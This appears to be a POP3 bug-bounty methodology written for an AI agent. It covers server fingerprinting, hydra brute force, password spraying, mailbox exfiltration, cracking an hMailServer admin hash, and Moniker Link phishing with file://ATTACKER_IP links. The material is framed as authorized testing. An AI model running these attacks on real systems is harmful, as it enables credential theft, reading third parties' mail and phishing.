---
technology: "POP3"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
provenance: "corpus-grounded on 2 chains (command-context gate 2026-11-12): chain A — Dovecot pop3d 110/995, nmap pop3-capabilities output (RESP-CODES PIPELINING SASL STLS AUTH-RESP-CODE TOP UIDL CAPA / SASL(PLAIN) USER), openssl s_client -connect :995, LOGIN/LIST/SELECT-style mailbox walk yielding PGP/AES-encrypted attachments and an SSH key; chain B — hMailServer pop3d banner as the fingerprint anchor, path traversal to ..\..\..\Program Files (x86)\hMailServer\Bin\hMailServer.ini, Administrator hash cracked offline, then authenticated mail-platform abuse (CVE-2024-21413 Moniker Link phishing as administrator). Upstream: RFC 1939 (state machine, USER/PASS/APOP, TOP/UIDL), nmap pop3-capabilities NSE docs (CAPA per RFC 2449, IMPLEMENTATION leak), Dovecot 2.3 core settings (auth_mechanisms, auth_failure_delay 2secs), THC-hydra README (POP3 module list). Thin unit, first-class per standing rule. Companion overview: [[pop3|POP3]]."
---

# POP3 bug bounty methodology

Target model: a POP3 endpoint on TCP/110 (cleartext) or TCP/995 (TLS), usually Dovecot on Linux or hMailServer on
Windows. The protocol offers no memory-safety surface worth chasing — every phase here is fingerprint, credentials,
and mailbox loot. Authorization assumed; mailbox contents are third-party data — read minimally, never DELE on a
live mailbox without sign-off.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Banner + CAPA fingerprint | port answers POP3 greeting | yes | Product/version -> config & CVE history — Info |
| USER/PASS guessing (hydra context) | username list available | n/a | Mailbox credential — Medium/High |
| Password spray across mailboxes | one candidate, many users | n/a | Domain-wide mailbox access — High |
| Mailbox exfil (STAT/LIST/TOP/RETR/UIDL) | valid credential | n/a | Resets, credentials, attachments — High (data) |
| Dovecot config/audit trail | shell or file read on host | n/a | passdb sources, auth logs — post-exp |
| hMailServer.ini admin hash | any file-read primitive on host | n/a | Mail-platform admin — High |

## Phase 0 — Detect and fingerprint

```bash
nmap -p 110,995 -sV -sC 198.51.100.20
# 110/tcp  open  pop3  Dovecot pop3d
# |_ pop3-capabilities: RESP-CODES PIPELINING SASL STLS AUTH-RESP-CODE TOP UIDL CAPA
# 995/tcp  open  ssl/pop3 Dovecot pop3d
# |_ pop3-capabilities: RESP-CODES PIPELINING SASL(PLAIN) USER AUTH-RESP-CODE TOP UIDL CAPA
# 110/tcp  open  pop3  hMailServer pop3d        <- Windows fork of the surface
```

Read the CAPA set as a behavior map: `STLS` means STARTTLS is available on 110 (the session can upgrade — cleartext
USER/PASS before the upgrade is still a sniffing finding); `SASL(PLAIN)` names the auth mechanisms the server will
take (Dovecot's default mechanism set is `plain`, with `apop`, `cram-md5`, `ntlm`, `gssapi` etc. available but
disabled unless configured); an `IMPLEMENTATION` entry, where present, is a direct version string. The observed Dovecot
output above is the canonical shape; hMailServer announces itself in the service banner instead.

## Phase 1 — Manual session (learn the box before scripting it)

```bash
# plaintext:
nc 198.51.100.20 110
# TLS (995):
openssl s_client -connect 198.51.100.20:995 -quiet

+OK Dovecot POP3 ready.
USER ayush
+OK
PASS jiujitsu
+OK Logged in.
STAT                       -> +OK 3 9037          (messages, bytes)
LIST                       -> per-message sizes
UIDL                       -> stable unique ids (selective re-download across sessions)
TOP 1 0                    -> headers only: triage subjects/senders before pulling bodies
RETR 1                     -> full message incl. base64 attachments
RSET                       -> un-mark any accidental DELE (deletions commit only at QUIT)
QUIT
```

`-ERR [AUTH ...]` responses fingerprint failure handling; Dovecot inserts a default 2-second `auth_failure_delay`
before answering failed auths — budget it into any guessing loop.

## Phase 2 — Credential attacks (hydra context)

The observed record has no brute-forced POP3 chain; the realistic entry is a credential you already hold (web app, phishing,
config read) plus POP3 as the *replay target*. When guessing is in scope, the POP3 module of hydra is the standard
driver — it speaks USER/PASS over the socket directly and takes the usual lists:

```bash
hydra -l ayush -P /usr/share/wordlists/rockyou.txt 198.51.100.20 pop3
# TLS endpoint: point the same module at 995 with the SSL option, or wrap with openssl s_client if tooling lacks it
```

Calibrations that decide success more than wordlists: (1) spray before brute — one org-standard password against
harvested `first.last@` addresses, because the mailbox password is so often the domain password; (2) every mail
client profile on a compromised workstation stores the POP3 password recoverably — pull those before generating
traffic; (3) Dovecot's failure delay and any policy service rate-limit per-source — throttle or distribute.

## Phase 3 — Mail exfil after credential compromise

Once a mailbox opens, work it in triage order:

1. `TOP n 0` all messages — subject/sender map; anything titled "credentials", "welcome", "access", "invoice".
2. `RETR` the hits: password-reset mails (often still-valid links/tokens), pasted credentials, VPN/RDP instructions,
   calendar attachments. Pull base64 attachments and decode — one observed chain's Drafts folder held an
   encrypted secret plus the Python script that had encrypted it, and a mailbox elsewhere in the same box held the
   SSH key that ended the user phase.
3. Remember POP3 exposes only the inbox — no Sent/Drafts/Archive folders (that was IMAP/webmail territory in the
   observed chains). If the same credentials work on 143/993 or webmail, pivot there for the full folder set.
4. Never `DELE` on a live mailbox: deletions commit at QUIT and are silent to the victim until they notice missing
   mail. Read-only collection is the defensible default.

## Phase 4 — Server-specific depth

**Dovecot (Linux).** One config drives imap+pop3 (`/etc/dovecot/dovecot.conf` + conf.d): note the passdb backend
(system users vs passwd-file vs SQL/LDAP — a SQL passdb often reuses a credentials DB you can hit elsewhere), the
`auth_mechanisms` list, and whether `disable_plaintext_auth` is honored on 110 (cleartext auth reachable on 110 is
itself a finding). Post-shell, the auth logs record every login attempt — including yours; timeline your activity.

**hMailServer (Windows).** The port cluster 25/110/143/465/587/993 with `hMailServer pop3d` banners points at
`C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` — in one observed chain a web-app path traversal
read it directly, the `Administrator` password hash inside cracked to a dictionary password, and mail-admin access
then allowed authenticated mail operations as administrator (the chain continued into CVE-2024-21413 Moniker Link
phishing — craft `file://ATTACKER_IP/...` style links so Windows Mail clients authenticate to you; details in the
[[smtp]] context). Any file-read primitive on an hMailServer host should try that ini path first.

## Phase 5 — Reporting anchors

- Cleartext USER/PASS accepted on 110 (no forced TLS) — Medium, sniffing credential exposure.
- Mailbox credential reuse across SSH/FTP/admin panels (observed pattern: same password on the box) — High.
- POP3 exposed to the internet at all on a legacy host — flag the spray surface, aged accounts, and lack of lockout.
- Tools used in this file, in prose: nmap with the pop3-capabilities NSE, netcat and openssl s_client for raw
  sessions, hydra for credential attacks, standard base64 tooling for attachments.
